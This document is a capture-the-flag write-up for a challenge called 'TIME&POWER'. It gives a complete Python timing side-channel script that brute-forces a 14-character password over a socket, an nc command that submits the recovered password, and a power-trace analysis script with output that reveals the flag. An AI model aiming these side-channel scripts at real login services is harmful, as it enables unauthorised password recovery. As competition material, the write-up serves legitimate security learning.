# TIME&POWER

1. Observe that there is time difference.

   ```python
   import socket
   import time
   import string
   import re
   import sys
   
   # --- Configuration ---
   HOST = "instance.penguin.0ops.sjtu.cn"  # Replace with the actual host
   PORT = 18139
   PASSWORD_LEN = 14
   TIMEOUT = 14
   # --- End Configuration ---
   
   
   def get_timing_and_progress(guess):
       """
       Connects, sends a guess, measures time, and captures max progress k.
       Returns (total_time, max_k_reached)
       """
       max_k_reached = 0
       start_time = 0
       end_time = 0
       output_buffer = b""
   
       try:
           # Use create_connection for simplicity, handles IPv4/v6
           with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as s:
               # Apply timeout to subsequent recv operations too
               s.settimeout(TIMEOUT)
   
               # 1. Read initial prompt (optional but good practice to sync)
               try:
                   # Read until the prompt is likely fully received
                   while b"password (all in lowercase letters):" not in output_buffer:
                       chunk = s.recv(1024)
                       if not chunk:  # Connection closed unexpectedly
                           raise ConnectionAbortedError(
                               "Connection closed before prompt received"
                           )
                       output_buffer += chunk
                       # Prevent infinite loop if prompt never comes
                       if (
                           time.perf_counter() - start_time > TIMEOUT / 2
                           and start_time != 0
                       ):
                           raise socket.timeout("Timeout waiting for full prompt")
                   # print(f"DEBUG: Prompt received: {output_buffer.decode(errors='ignore').strip()}") # Uncomment for debug
                   output_buffer = b""  # Clear buffer after prompt
               except socket.timeout:
                   print(
                       f"Error: Timeout waiting for initial prompt from {HOST}:{PORT}.",
                       file=sys.stderr,
                   )
                   return -1, -1  # Indicate error
               except Exception as e:
                   print(f"Error receiving initial prompt: {e}", file=sys.stderr)
                   return -1, -1
   
               # 2. Send guess
               full_guess = (guess + "\n").encode()
               start_time = time.perf_counter()  # Start timer *just* before sending
               s.sendall(full_guess)
   
               # 3. Receive response and measure time/progress
               while True:
                   try:
                       chunk = s.recv(64)  # Read small chunks
                       if not chunk:
                           # Connection closed by server - this might happen on success OR failure
                           # print(f"DEBUG: Connection closed for guess '{guess}'")
                           break
                       output_buffer += chunk
   
                       # Use non-greedy match to find the *last* number possibly preceded by CR
                       # Search the decoded buffer to handle potential multi-byte chars or encoding issues simply
                       decoded_buffer = output_buffer.decode(errors="ignore")
                       matches = list(
                           re.finditer(r"Checking...\((\d+)/14\)", decoded_buffer)
                       )
                       if matches:
                           current_k = int(matches[-1].group(1))
                           max_k_reached = max(max_k_reached, current_k)
   
                       # Check for final "Wrong password" message to ensure we stop after failure indication
                       if (
                           b"Wrong password." in output_buffer
                           or b"Invalid length!" in output_buffer
                       ):
                           # print(f"DEBUG: Failure message received for '{guess}'")
                           break
   
                   except socket.timeout:
                       # This is expected if the server doesn't explicitly close or send "Wrong password" quickly enough
                       # print(f"DEBUG: Socket timeout during recv for guess '{guess}'. Assuming process ended.")
                       break
                   except ConnectionResetError:
                       # print(f"DEBUG: Connection reset by peer for guess '{guess}'.")
                       break
                   except Exception as e:
                       print(
                           f"Error during recv for guess '{guess}': {e}", file=sys.stderr
                       )
                       # Depending on the error, might want to retry or abort
                       # For now, treat as failure for this guess
                       end_time = time.perf_counter()  # Log time up to the error point
                       total_time = end_time - start_time if start_time else -1
                       return (
                           total_time,
                           max_k_reached,
                       )  # Return current findings despite error
   
               end_time = time.perf_counter()
   
       except socket.timeout:
           print(
               f"Error: Timeout connecting or sending for guess '{guess}'.",
               file=sys.stderr,
           )
           return -1, -1
       except ConnectionRefusedError:
           print(
               f"Error: Connection refused for {HOST}:{PORT}. Server down?",
               file=sys.stderr,
           )
           return -1, -1
       except ConnectionAbortedError as e:
           print(f"Error: {e}", file=sys.stderr)
           return -1, -1
       except Exception as e:
           print(
               f"An unexpected socket error occurred for guess '{guess}': {e}",
               file=sys.stderr,
           )
           return -1, -1
   
       total_time = end_time - start_time if start_time and end_time else -1
   
       # print(f"DEBUG: Guess: {guess}, Max K: {max_k_reached}, Time: {total_time:.4f}")
       # print(f"DEBUG: Final Received: {output_buffer.decode(errors='ignore').strip()}")
   
       return total_time, max_k_reached
   
   
   # --- Main Attack Loop ---
   known_password = ""
   # IMPORTANT: Change filler char to something unlikely to be in the password
   # and less likely to have special timing, like 'z' or 'x'.
   filler_char = "z"
   print(f"Starting attack on {HOST}:{PORT} using filler '{filler_char}'...")
   print(f"Looking for the character that causes the LONGEST execution time at each step.")
   
   for i in range(PASSWORD_LEN):
       print(f"\nFinding character {i + 1}/{PASSWORD_LEN}...")
       # Store results for this position: char -> (total_time, max_k)
       results = {}
   
       best_char = None
       longest_time_so_far = -1.0  # Initialize to ensure any positive time is larger
       max_k_for_best_char = -1  # Store max_k corresponding to the longest time for info
   
       # Test each character 'a' through 'z'
       possible_chars = string.ascii_lowercase
       for char in possible_chars:
           padding_len = PASSWORD_LEN - len(known_password) - 1
           # Ensure padding length is never negative (shouldn't happen in normal flow)
           padding_len = max(0, padding_len)
           test_guess = known_password + char + (filler_char * padding_len)
   
           # Optional: Add retry logic here if network is noisy
           # e.g., run get_timing_and_progress 3 times and average/take median time
           total_time, max_k = get_timing_and_progress(test_guess)
   
           if total_time < 0:  # Handle errors reported as negative time
               print(f"  Error testing char '{char}'. Skipping.", file=sys.stderr)
               continue  # Skip this character if the test failed
   
           results[char] = (total_time, max_k)
           print(f"  Tested: '{test_guess}' -> Max K: {max_k}, Time: {total_time:.4f}s")
   
           # --- UPDATED Analysis Logic ---
           # The correct character is the one that results in the significantly LONGEST total execution time.
           if total_time > longest_time_so_far:
               # Check if the time difference is significant (e.g., > 0.5 seconds)
               # compared to the average or previous best, to avoid noise.
               # This check is optional but can help filter noise.
               # We can skip it for now and rely purely on the maximum time.
   
               longest_time_so_far = total_time
               max_k_for_best_char = max_k  # Store associated max_k
               best_char = char
               # Use a more descriptive print message
               print(
                   f"    >> New longest time found: {total_time:.4f}s for char '{
                       char
                   }' (Max K reached: {max_k}) <<"
               )
   
       if best_char is None:
           print("\nError: Could not determine next character. Attack failed.")
           print(
               "Review the times above. Was there a clear outlier with the longest time?"
           )
           # Print results sorted by time descending for easier manual inspection
           print("Results for this position (Sorted by Time Desc):")
           # Sort items based on time (index 0 of the tuple value)
           sorted_results = sorted(
               results.items(), key=lambda item: item[1][0], reverse=True
           )
           for c, (t, k) in sorted_results:
               print(f"  '{c}': Time = {t:.4f}s, Max K = {k}")
           sys.exit(1)
   
       known_password += best_char
       # Use the actual filler char in the status message for clarity
       current_filler = filler_char * (PASSWORD_LEN - len(known_password))
       print(f"\nFound character {i + 1}: '{best_char}'")
       print(f"Current password guess: {known_password}{current_filler}")
   
   print(f"\nAttack finished.")
   if len(known_password) == PASSWORD_LEN:
       print(f"Likely password: {known_password}")
       # Optional: Try logging in with the found password automatically
       # Need to know what success looks like (e.g., different message, shell prompt)
   else:
       print(f"Attack incomplete. Found: {known_password}")
   
   ```

2. `echo "aaaaaaaaaadmin" | nc redacted.com > result.txt`

3. Remove the none-base64 texts in result.txt. `base64 -d result_trim.txt > data.npz`

4. Write code to load the numpy data.npz:

   ```python
   import numpy as np
   import sys
   import glob  # To find .npy files
   
   # --- Assume data.npz was successfully UNZIPPED in the current directory ---
   
   # Find all .npy files in the current directory
   npy_files = glob.glob("*.npy")
   
   if not npy_files:
       print("Error: Could not find any extracted .npy files in the current directory.")
       print("Please make sure you have successfully run 'unzip data.npz'.")
       sys.exit(1)
   
   print(f"Found .npy files: {npy_files}")
   
   # Analyze each extracted .npy file
   for npy_file in npy_files:
       print(f"\n--- Loading Array File: '{npy_file}' ---")
       try:
           # Load the individual .npy file
           array_content = np.load(npy_file)
   
           # Reuse the analysis logic from the previous script
           print(f"  Shape: {array_content.shape}")
           print(f"  Data type: {array_content.dtype}")
   
           if array_content.ndim == 1:
               print(f"  Length: {len(array_content)}")
               if array_content.dtype.kind in ("U", "S"):  # Character data
                   try:
                       joined_string = "".join(array_content.astype(str))
                       print(f"  Content interpreted as string (first 500 chars):")
                       print(
                           joined_string[:500]
                           + ("..." if len(joined_string) > 500 else "")
                       )
                       # Check for flag
                       if "0ops{" in joined_string or "ctf{" in joined_string:
                           print("\n>>> Potential flag found in string content! <<<")
                           import re
   
                           flag_match = re.search(
                               r"(flag\{.*?\})|(ctf\{.*?\})", joined_string, re.IGNORECASE
                           )
                           if flag_match:
                               print(f"Extracted Flag: {flag_match.group(0)}")
                   except Exception as e:
                       print(f"  Could not join array elements into a string: {e}")
                       print(f"  Content (first 200 elements): {array_content[:200]}")
               else:  # Numerical data
                   print(f"  Content (first 200 elements): {array_content[:200]}")
           else:
               print(f"  Content (excerpt): {array_content}")
   
       except Exception as e:
           print(f"An error occurred while loading or analyzing '{npy_file}': {e}")
           import traceback
   
           traceback.print_exc()
   
   ```

   Got result:

   ```
   Found .npy files: ['power.npy', 'input.npy', 'input_id.npy']
   
   --- Loading Array File: 'power.npy' ---
     Shape: (1053, 100)
     Data type: float64
     Content (excerpt): [[ 9.99338473  9.9500203  10.17369277 ... 10.01741255  9.84631841
      9.71998581]
    [10.00522572  9.93331289 10.08473738 ...  9.98638708  9.99826218
      9.87041864]
    [ 9.92832395  9.9966624  10.36576194 ...  9.97856834  9.91700687
      9.52462337]
    ...
    [10.07031092 10.03015613 10.27347144 ...  9.99176281  9.90746999
      9.89363311]
    [ 9.88128949  9.87726085 10.29848535 ... 10.0529508   9.87521493
     10.01038549]
    [ 9.94650062  9.96259657 10.21905941 ...  9.80249427  9.90100893
     10.19439496]]
   
   --- Loading Array File: 'input.npy' ---
     Shape: (1053,)
     Data type: <U1
     Length: 1053
     Content interpreted as string (first 500 chars):
   abcdefghijklmnopqrstuvwxyz0123456789_{}abcdefghijklmnopqrstuvwxyz0123456789_{}abcdefghijklmnopqrstuvwxyz0123456789_{}abcdefghijklmnopqrstuvwxyz0123456789_{}abcdefghijklmnopqrstuvwxyz0123456789_{}abcdefghijklmnopqrstuvwxyz0123456789_{}abcdefghijklmnopqrstuvwxyz0123456789_{}abcdefghijklmnopqrstuvwxyz0123456789_{}abcdefghijklmnopqrstuvwxyz0123456789_{}abcdefghijklmnopqrstuvwxyz0123456789_{}abcdefghijklmnopqrstuvwxyz0123456789_{}abcdefghijklmnopqrstuvwxyz0123456789_{}abcdefghijklmnopqrstuvwxyz012345...
   
   --- Loading Array File: 'input_id.npy' ---
     Shape: (1053,)
     Data type: int32
     Length: 1053
     Content (first 200 elements): [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
    0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1
    1 1 1 1 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2
    2 2 2 2 2 2 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3
    3 3 3 3 3 3 3 3 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4
    4 4 4 4 4 4 4 4 4 4 5 5 5 5 5]
   ```

5. Analyze power (using MaxAbsDiff):

   ```python
   import numpy as np
   import matplotlib.pyplot as plt
   import sys
   
   # --- Configuration ---
   PLOT_AVERAGES = True  # Set to True to generate plots for each position
   # ---
   
   # Load the data
   try:
       power_traces = np.load("power.npy")
       guessed_chars = np.load("input.npy")
       position_ids = np.load("input_id.npy")
       print("Successfully loaded .npy files.")
       print(f"Power traces shape: {power_traces.shape}")
       print(f"Guessed chars shape: {guessed_chars.shape}")
       print(f"Position IDs shape: {position_ids.shape}")
   
   except FileNotFoundError:
       print(
           "Error: One or more .npy files (power.npy, input.npy, input_id.npy) not found."
       )
       # ... (rest of error handling)
       sys.exit(1)
   except Exception as e:
       print(f"An error occurred loading the .npy files: {e}")
       sys.exit(1)
   
   # Determine the length of the secret password/flag
   num_positions = np.max(position_ids) + 1
   print(f"\nInferred password/flag length: {num_positions}")
   
   recovered_secret = ""
   
   # Iterate through each position in the secret
   for p in range(num_positions):
       print(f"\nAnalyzing position {p}...")
   
       indices_for_pos = np.where(position_ids == p)[0]
       if len(indices_for_pos) == 0:
           print(f"  Warning: No data found for position {p}. Skipping.")
           recovered_secret += "?"
           continue
   
       power_at_pos = power_traces[indices_for_pos]
       chars_at_pos = guessed_chars[indices_for_pos]
       unique_chars_guessed = np.unique(chars_at_pos)
       print(f"  Characters guessed at this position: {
             ''.join(unique_chars_guessed)}")
   
       overall_avg_trace = np.mean(power_at_pos, axis=0)
       char_metrics = {}  # Store a difference metric for each character
   
       if PLOT_AVERAGES:
           plt.figure(figsize=(12, 6))
           plt.title(
               f"Position {
                   p
               }: Average Power Trace per Guessed Character (Metric: Max Abs Diff)"
           )  # Updated title
           plt.xlabel("Time Sample")
           plt.ylabel("Average Power")
   
       for char in unique_chars_guessed:
           indices_for_char = np.where(chars_at_pos == char)[0]
           traces_for_char = power_at_pos[indices_for_char]
           avg_trace_for_char = np.mean(traces_for_char, axis=0)
           diff_trace = avg_trace_for_char - overall_avg_trace
   
           # --- !!! USE MAX ABSOLUTE DIFFERENCE METRIC !!! ---
           metric = np.max(np.abs(diff_trace))
           # --- !!! ---
   
           char_metrics[char] = metric
   
           if PLOT_AVERAGES:
               # Changed label slightly to avoid confusion if metric values are very small/large
               plt.plot(
                   avg_trace_for_char,
                   label=f"Guess: '{char}' (Metric: {metric:.4f})",
                   alpha=0.7,
               )
   
       if not char_metrics:
           print(f"  Error: No metrics calculated for position {p}.")
           best_char = "?"
       else:
           # Find the character with the maximum difference metric
           best_char = max(char_metrics, key=char_metrics.get)
           # Get the value for printing
           best_metric_value = char_metrics[best_char]
           print(
               f"  Best character based on MaxAbsDiff metric ({best_metric_value:.4f}): '{
                   best_char
               }'"
           )
   
       recovered_secret += best_char
   
       if PLOT_AVERAGES:
           try:
               indices_for_best_char = np.where(chars_at_pos == best_char)[0]
               traces_for_best_char = power_at_pos[indices_for_best_char]
               avg_trace_for_best_char = np.mean(traces_for_best_char, axis=0)
               # Highlight the best trace
               plt.plot(
                   avg_trace_for_best_char,
                   label=f"BEST: '{best_char}'",
                   linewidth=3,
                   color="red",
               )
           except (ValueError, KeyError):
               print(f"  Could not plot best char '{best_char}'.")
   
           plt.legend(loc="center left", bbox_to_anchor=(1, 0.5))
           plt.grid(True)
           plt.tight_layout(rect=[0, 0, 0.85, 1])
           plt.savefig(f"position_{p}_avg_traces_maxabs.png")  # Changed filename
           plt.close()
   
   # Print the final recovered secret
   print(f"\n\nRecovered Secret (using MaxAbsDiff): {recovered_secret}")
   
   # Check format again
   if recovered_secret.startswith("0ops{") and recovered_secret.endswith(
       "}"
   ):  # Check end bracket if length allows
       print("Format looks like a flag!")
   elif recovered_secret.startswith("0ops{"):
       print(
           "Starts like a flag, might be missing the closing bracket '}' if dataset was incomplete."
       )
   else:
       print("Format might not be a standard flag, check the result carefully.")
   
   ```

   Result:

   ```
   Successfully loaded .npy files.
   Power traces shape: (1053, 100)
   Guessed chars shape: (1053,)
   Position IDs shape: (1053,)
   
   Inferred password/flag length: 27
   
   Analyzing position 0...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (1.1382): '0'
   
   Analyzing position 1...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (0.8705): 'o'
   
   Analyzing position 2...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (1.0196): 'p'
   
   Analyzing position 3...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (1.0585): 's'
   
   Analyzing position 4...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (1.1380): '{'
   
   Analyzing position 5...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (0.7417): 'p'
   
   Analyzing position 6...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (1.0437): 'o'
   
   Analyzing position 7...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (1.0288): 'w'
   
   Analyzing position 8...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (0.7576): 'e'
   
   Analyzing position 9...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (0.7628): 'r'
   
   Analyzing position 10...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (1.0336): '_'
   
   Analyzing position 11...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (0.9820): '1'
   
   Analyzing position 12...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (1.0951): 's'
   
   Analyzing position 13...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (0.9446): '_'
   
   Analyzing position 14...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (0.9600): 'a'
   
   Analyzing position 15...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (0.9234): '1'
   
   Analyzing position 16...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (0.8443): '1'
   
   Analyzing position 17...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (0.8677): '_'
   
   Analyzing position 18...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (1.0228): 'y'
   
   Analyzing position 19...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (0.9708): '0'
   
   Analyzing position 20...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (1.0125): 'u'
   
   Analyzing position 21...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (1.0120): '_'
   
   Analyzing position 22...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (1.0548): 'n'
   
   Analyzing position 23...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (0.9635): '5'
   
   Analyzing position 24...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (1.0379): '5'
   
   Analyzing position 25...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (0.8961): 'd'
   
   Analyzing position 26...
     Characters guessed at this position: 0123456789_abcdefghijklmnopqrstuvwxyz{}
     Best character based on MaxAbsDiff metric (1.0133): '}'
   
   
   Recovered Secret (using MaxAbsDiff): 0ops{power_1s_a11_y0u_n55d}
   Format looks like a flag!
   ```

   
